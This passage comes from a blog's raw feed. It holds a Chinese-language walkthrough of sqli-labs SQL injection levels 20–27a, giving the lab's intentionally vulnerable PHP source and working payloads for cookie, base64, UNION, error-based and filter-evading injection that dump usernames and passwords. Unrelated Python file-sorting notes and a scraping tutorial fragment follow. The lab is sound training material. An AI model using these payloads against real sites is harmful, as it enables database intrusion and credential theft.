FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">		$result1 = mysql_query($sql);</span><br><span class="line">		$row1 = mysql_fetch_array($result1);</span><br><span class="line">		$cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">			<span class="keyword">if</span>($row1)</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">				setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);	</span><br><span class="line">				header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"I LOVE YOU COOKIES"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size = 3 &gt;'</span>;			</span><br><span class="line">				<span class="comment">//echo 'Your Cookie is: ' .$cookee;</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				print_r(mysql_error());			</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line">				<span class="comment">//echo "Try again looser";</span></span><br><span class="line">				print_r(mysql_error());</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;			</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/font&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">			$format = <span class="string">'D d M Y - H:i:s'</span>;</span><br><span class="line">			$timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;font color= "red" font size="4"&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR USER AGENT IS : "</span>.$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "cyan" font size="4"&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR IP ADDRESS IS : "</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>];			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4 &gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "orange" font size = 5 &gt;'</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR COOKIE : uname = $cookee and expires: "</span> . date($format, $timestamp);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">			$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$result)</span><br><span class="line">  				&#123;</span><br><span class="line">  				<span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  				&#125;</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			<span class="keyword">if</span>($row)</span><br><span class="line">				&#123;</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">'&lt;font color= "pink" font size="5"&gt;'</span>;	</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "grey" font size="5"&gt;'</span>;  	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;/b&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your ID:'</span> .$row[<span class="string">'id'</span>];</span><br><span class="line">			  	&#125;</span><br><span class="line">			<span class="keyword">else</span>	</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">				<span class="comment">//echo '&lt;img src="../images/Less-20.jpg" /&gt;';</span></span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/center&gt;'</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 6 &gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">" Your Cookie is deleted"</span>;</span><br><span class="line">				setcookie(<span class="string">'uname'</span>, $row1[<span class="string">'username'</span>], time()<span class="number">-3600</span>);</span><br><span class="line">				header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="comment">//header ('Location: main.php');</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//echo '&lt;img src="../images/slap.jpg" /&gt;&lt;/center&gt;';</span></span><br><span class="line">			<span class="comment">//logging the connection parameters to a file for analysis.	</span></span><br><span class="line">		$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">		fwrite($fp,<span class="string">'Cookie:'</span>.$cookee.<span class="string">"\n"</span>);</span><br><span class="line">	</span><br><span class="line">		fclose($fp);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821174108601.png"  alt="image-20200821174108601"></p>
<p>查询语句中使用了cookee，尝试在cookies里面进行注入，抓包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821174908989.png"  alt="image-20200821174908989"></p>
<p>看到cookie：uname=admin，确定是cookie注入</p>
<p>在admin后加’，报错，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; order by 3--+ &#x2F;&#x2F;1-3 正常</span><br><span class="line">Cookie: uname&#x3D;admin&#39; order by 4--+ &#x2F;&#x2F;4 不正常 ，确定行数为3</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: uname&#x3D;-admin&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821175344820.png"  alt="image-20200821175344820"></p>
<p>uname值base64加密，其余与上一个题相同</p>
<p>上传加密语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and 1&#x3D;1 --+    &#x2F;&#x2F;明文</span><br><span class="line">YWRtaW4nIGFuZCAxPTEgLS0r    &#x2F;&#x2F;密文</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39;) union select 1,2,database()#</span><br><span class="line">LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>



<h2 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h2><p>双引号，其余与上一题相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&quot; union select 1,2,database()#</span><br><span class="line">LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>



<h2 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821175659085.png"  alt="image-20200821175659085"></p>
<p>没有输入框，考虑get型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p>报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,2,database() &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() or &#39;1&#39;&#x3D; &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; or &#39;1&#39;&#x3D; &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; &#x3D; &#39;</span><br></pre></td></tr></table></figure>



<h2 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a><strong>Less - 24</strong> Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</h2><p>注册用户 admin’#</p>
<p>登录后修改密码，语句成为</p>
<figure class="highlight plain"><figcaption><span>users SET passwd</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">然后用修改过的密码登录admin账号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## **Less-25** Trick with OR &amp; AND (过滤了or和and)</span><br><span class="line"></span><br><span class="line">![image-20200829115431073](sqli-labs.assets&#x2F;image-20200829115431073.png)</span><br><span class="line"></span><br><span class="line">过滤了or和and</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115520696.png"  alt="image-20200829115520696"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">报错</span><br><span class="line"></span><br><span class="line">![image-20200829115610277](sqli-labs.assets&#x2F;image-20200829115610277.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;?id&#x3D;1&#39;%23</span><br></pre></td></tr></table></figure>

<p>成功，可以注入</p>
<h3 id="使用union查询"><a href="#使用union查询" class="headerlink" title="使用union查询"></a>使用union查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115753647.png"  alt="image-20200829115753647"></p>
<p>注意犹豫过滤了or，将password改成passwoorrd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115901068.png"  alt="image-20200829115901068"></p>
<h3 id="双写or和and"><a href="#双写or和and" class="headerlink" title="双写or和and"></a>双写or和and</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; oorr 1&#x3D;1 --+</span><br><span class="line">?id&#x3D;2&#39; aandnd 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>

<p>成功</p>
<h2 id="Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26(failed) Trick with comments and space (过滤了注释和空格的注入)"></a><strong>Less-26(failed)</strong> Trick with comments and space (过滤了注释和空格的注入)</h2><p>借鉴：<a href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener">https://www.jianshu.com/p/ff72f2c6d99c</a></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = blacklist($id);</span><br><span class="line">$hint =$id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>,$id);             <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,$id);          <span class="comment">//strip out /*</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out --</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,$id);             <span class="comment">//Strip out #</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>,$id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>不仅过滤了上一关的<code>or</code>与<code>and</code>，还过滤了单行注释<code>--</code>与<code>#(含URL编码)</code>以及多行注释<code>/**/</code>（被解释为空格，常用于过滤空格时），还过滤了<code>(空格)</code>，以及正反斜杠<code>/</code>与<code>\</code>。</p>
<p>使用%a0绕过，没有成功</p>
<h3 id="updatexml注入"><a href="#updatexml注入" class="headerlink" title="updatexml注入"></a>updatexml注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123019418.png"  alt="image-20200829123019418"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),0)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123117750.png"  alt="image-20200829123117750"></p>
<h2 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123418086.png"  alt="image-20200829123418086"></p>
<p>没有过滤大写的关键字</p>
<p>把or换成&amp;&amp;（%26%26）</p>
<p>题解里面写的用%a0绕过空格过滤，我这里没有成功</p>
<h2 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h2><p>双引号型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(length(database())&gt;7)%a0uNion%a0sELect%a01,2,&quot;3</span><br></pre></td></tr></table></figure>

<p>同样，%a0过滤不成功</p>
]]></content>
  </entry>
  <entry>
    <title>python/零散笔记</title>
    <url>/2020/08/07/python/%E9%9B%B6%E6%95%A3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="按照字符串列表中的数字排序"><a href="#按照字符串列表中的数字排序" class="headerlink" title="按照字符串列表中的数字排序"></a>按照字符串列表中的数字排序</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">at_name = os.listdir(<span class="string">'C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/'</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryint</span><span class="params">(s)</span>:</span>                       <span class="comment">#将元素中的数字转换为int后再排序</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> int(s)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(v_str)</span>:</span>                <span class="comment">#将元素中的字符串和数字分割开</span></span><br><span class="line">    a=[tryint(sub_str) <span class="keyword">for</span> sub_str <span class="keyword">in</span> re.split(<span class="string">'([0-9]+)'</span>, v_str)][<span class="number">1</span>]<span class="comment"># [1]是数字的部分</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_humanly</span><span class="params">(v_list)</span>:</span>    <span class="comment">#以分割后的list为单位进行排序</span></span><br><span class="line">    <span class="keyword">return</span> sorted(v_list, key=str2int)</span><br><span class="line"></span><br><span class="line">atac_name=sort_humanly(at_name)</span><br></pre></td></tr></table></figure>

<h1 id="修改文件名"><a href="#修改文件名" class="headerlink" title="修改文件名"></a>修改文件名</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">at_name = os.listdir(<span class="string">'C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/'</span>)</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tryint</span><span class="params">(s)</span>:</span>                       <span class="comment">#将元素中的数字转换为int后再排序</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> int(s)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(v_str)</span>:</span>                <span class="comment">#将元素中的字符串和数字分割开</span></span><br><span class="line">    a=[tryint(sub_str) <span class="keyword">for</span> sub_str <span class="keyword">in</span> re.split(<span class="string">'([0-9]+)'</span>, v_str)]</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_humanly</span><span class="params">(v_list)</span>:</span>    <span class="comment">#以分割后的list为单位进行排序</span></span><br><span class="line">    <span class="keyword">return</span> sorted(v_list, key=str2int)</span><br><span class="line"></span><br><span class="line">atac_name=sort_humanly(at_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> temp <span class="keyword">in</span> atac_name:</span><br><span class="line">    print(temp)</span><br><span class="line">    print(str(i))</span><br><span class="line"></span><br><span class="line">    a=temp</span><br><span class="line">    print(a)</span><br><span class="line">    os.rename(<span class="string">'C:/Users/lxm/Desktop/打印/文件/其它/5装订_2份/'</span> + temp,</span><br><span class="line">    <span class="string">'C:/Users/lxm/Desktop/打印/文件/其它_/5装订_2份/'</span> +str(i)+<span class="string">'_'</span>+ temp)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>莫烦Python——爬虫</title>
    <url>/2020/07/14/python/%E7%88%AC%E8%99%AB/%E7%88%AC%E8%99%AB%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>内容来自：<a href="https://morvanzhou.github.io/" target="_blank" rel="noopener">https://morvanzhou.github.io/</a></p>
</blockquote>
<h1 id="爬虫简介"><a href="#爬虫简介" class="headerlink" title="爬虫简介"></a>爬虫简介</h1><h2 id="了解网页的结构"><a href="#了解网页的结构" class="headerlink" title="了解网页的结构"></a>了解网页的结构</h2><p>html，css，js</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line"></span><br><span class="line"><span class="comment"># if has Chinese, apply decode()</span></span><br><span class="line">html = urlopen(</span><br><span class="line">    <span class="string">"https://morvanzhou.github.io/static/scraping/basic-structure.html"</span></span><br><span class="line">).read().decode(<span class="string">'utf-8'</span>) </span><br><span class="line"><span class="comment"># read读出网页源码</span></span><br><span class="line"><span class="comment"># 网页中有中文，用decode解码</span></span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
<p>打印出来内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;cn&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;Scraping tutorial 1 | 莫烦Python&lt;&#x2F;title&gt;</span><br><span class="line">	&lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;static&#x2F;img&#x2F;description&#x2F;tab_icon.png&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;爬虫测试1&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;p&gt;</span><br><span class="line">		这是一个在 &lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;&quot;&gt;莫烦Python&lt;&#x2F;a&gt;</span><br><span class="line">		&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;morvanzhou.github.io&#x2F;tutorials&#x2F;data-manipulation&#x2F;scraping&#x2F;&quot;&gt;爬虫教程&lt;&#x2F;a&gt; 中的简单测试.</span><br><span class="line">	&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用正则表达式匹配tag，筛选信息</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># 找到网页的title</span></span><br><span class="line">res = re.findall(<span class="string">r"&lt;title&gt;(.+?)&lt;/title&gt;"</span>, html)</span><br><span class="line">print(<span class="string">"\nPage title is: "</span>, res[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Page title is:  Scraping tutorial 1 | 莫烦Python</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flags=re.DOTALL，使对tab、new line不敏感</span></span><br><span class="line"><span class="comment"># 如果去掉这个参数，则不能查找出所需内容</span></span><br><span class="line">res = re.findall(<span class="string">r"&lt;p&gt;(.*?)&lt;/p&gt;"</span>, html, flags=re.DOTALL)    <span class="comment"># re.DOTALL if multi line</span></span><br><span class="line">print(<span class="string">"\nPage paragraph is: "</span>, res[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
